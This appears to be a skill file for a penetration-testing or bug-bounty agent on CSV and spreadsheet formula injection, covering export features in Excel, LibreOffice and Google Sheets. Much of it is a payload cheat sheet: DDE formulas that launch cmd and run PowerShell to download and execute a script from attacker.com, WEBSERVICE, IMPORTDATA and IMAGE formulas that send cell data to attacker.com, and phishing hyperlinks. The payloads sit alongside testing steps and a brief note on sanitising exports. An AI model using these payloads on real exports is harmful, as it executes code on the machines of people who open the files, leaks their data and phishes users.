---
name: csv-formula-injection
description: CSV/spreadsheet formula injection in export features that execute commands in Excel, LibreOffice, and Google Sheets
---

# CSV / Formula Injection

CSV injection (also called Formula Injection or Excel Macro Injection) occurs when user-supplied data is included in CSV, XLSX, ODS, or similar spreadsheet exports without sanitization. When the exported file is opened in a spreadsheet application, injected formulas execute — potentially exfiltrating data, making outbound connections, or (in some cases) executing local commands.

## Attack Surface

**Export Features**
- "Export to CSV" / "Download as Excel" functionality
- Report generation: financial reports, user lists, analytics exports
- Audit logs exported to spreadsheet
- Support ticket exports
- Contact/customer data exports

**Input Vectors**
- Any field that ends up in an exported spreadsheet:
  - Name, company, address fields
  - Comment/description fields
  - Subject/title fields
  - Username, email
  - Any user-controlled data in admin/reporting exports

## Injection Characters

Spreadsheet applications treat cells starting with these characters as formulas:
```
=   → formula start (most common)
+   → formula start
-   → formula start
@   → formula start (Excel)
\t  → tab character (can misparse columns)
\r  → carriage return (can inject new rows)
\n  → newline (can inject new rows)
```

## Payload Examples

### OOXML/DDE (Dynamic Data Exchange) — Windows RCE

```
=cmd|' /C calc'!A0
=cmd|' /C whoami > C:\Users\Public\pwned.txt'!A0
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!A0

# DDE in Excel
=DDE("cmd","/c calc","1")
=DDE("cmd","/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/x.ps1')","1")
```

### Data Exfiltration (Universal — works in Google Sheets, Excel Online)

```
# Exfiltrate current document data via WEBSERVICE/IMPORTDATA
=WEBSERVICE("http://attacker.com/?data="&A1)
=IMPORTDATA("http://attacker.com/?d="&CONCATENATE(A1,A2,A3))

# Google Sheets specific
=IMPORTXML(CONCAT("http://attacker.com/?leak=",CONCATENATE(A1:Z99)),"//a")
=IMAGE("https://attacker.com/?d="&A1)

# Exfiltrate file contents
=HYPERLINK("http://attacker.com/?d="&A1,"Click here")

# Formula to read other cells and send externally
=WEBSERVICE(CONCAT("http://attacker.com/?s=",INDIRECT("A"&ROW())))
```

### Hyperlink Injection

```
=HYPERLINK("http://attacker.com/phishing","Click to view invoice")
=HYPERLINK("http://attacker.com/","Verify your account")
```

### Exfil via DNS (when HTTP blocked)

```
# Excel/LibreOffice may allow UNC paths for DNS leak
=WEBSERVICE("\\\\attacker.com\\a")
=CALL("KERNEL32","GetTempPathA","JCJ",255,A1)
```

## Context-Specific Payloads

### Google Sheets

```
=IMPORTDATA("https://attacker.com/?d="&A1)
=IMAGE("https://attacker.com/?leak="&ENCODEURL(A1))
=HYPERLINK(CONCAT("https://attacker.com/?q=",A1),"link")

# Docs formula that exfiltrates spreadsheet owner
=WEBSERVICE("https://attacker.com/?user="&CELL("address",A1))
```

### LibreOffice Calc

```
=WEBSERVICE("http://attacker.com/?d="&A1)
# LibreOffice macro execution is less common but possible with user approval
```

### Excel (Desktop)

```
# DDE (disabled by default since 2017 but still tested)
=cmd|' /C powershell...'!A0

# External data connection
=WEBSERVICE("http://attacker.com/?d="&A1)
# Excel 2016+ blocks WEBSERVICE for external URLs by default but not LAN
```

## Testing Methodology

1. **Find export features** — Download CSV/Excel from admin panels, reports, profiles
2. **Inject in all user-controlled fields** — Name, email, comments, any text field
3. **Basic formula probe** — `=1+1` → if cell shows `2` in export, formula injection confirmed
4. **Test = + - @ chars** — Try each as first character
5. **WEBSERVICE/IMPORTDATA** — Set up OAST listener, inject exfiltration payload
6. **Test hyperlink injection** — Check if phishing links render in exported file
7. **DDE test** — Try `=cmd|' /C calc'!A0` in Excel environments

## Validation

1. Show the exported CSV/XLSX with the injected formula visible in a cell
2. Demonstrate that the formula executes when file is opened (if possible safely)
3. For exfiltration: show OAST callback with cell data
4. For DDE: show that cmd/calc launches (only in controlled test environment)

## False Positives

- Export sanitizes leading special characters (prepends apostrophe: `'=formula`)
- Export adds quotes around all fields preventing formula interpretation
- Application uses library that escapes formula characters (e.g., Apache POI with proper escaping)

## Impact

| Scenario | Impact |
|----------|--------|
| Admin exports user data | DDE RCE on admin's machine |
| User exports own data | Self-XSS (lower severity) |
| Scheduled reports to executives | High-value target for DDE |
| Google Sheets imports | Exfiltration of spreadsheet data |
| Phishing via hyperlink | Credential theft |

## Pro Tips

1. The highest impact is DDE/RCE → but requires Excel + user accepting security warning → P2/P3
2. WEBSERVICE-based exfiltration via OAST is proof without any user interaction → P3/P4
3. Focus on admin export features — admins open exported files more often
4. `=1+1` is your safe canary — if you get `2` in the output cell, injection confirmed
5. Prefix with `@` for Excel-specific execution: `@SUM(1+1)*cmd|' /C calc'!A0`
6. Some bug bounty programs specifically mention "CSV injection" as in-scope
7. Google Sheets auto-executes `=IMPORTDATA()` without user confirmation → data exfil is real

## Summary

CSV injection persists because sanitizing formula characters feels unnecessary — until an admin opens an export. The highest-risk targets are admin-facing exports in desktop Excel. Use `=1+1` to confirm injection, WEBSERVICE/IMPORTDATA for exfiltration proof, and DDE for RCE demonstration. Always sanitize leading formula characters by prefixing with apostrophe or removing them.
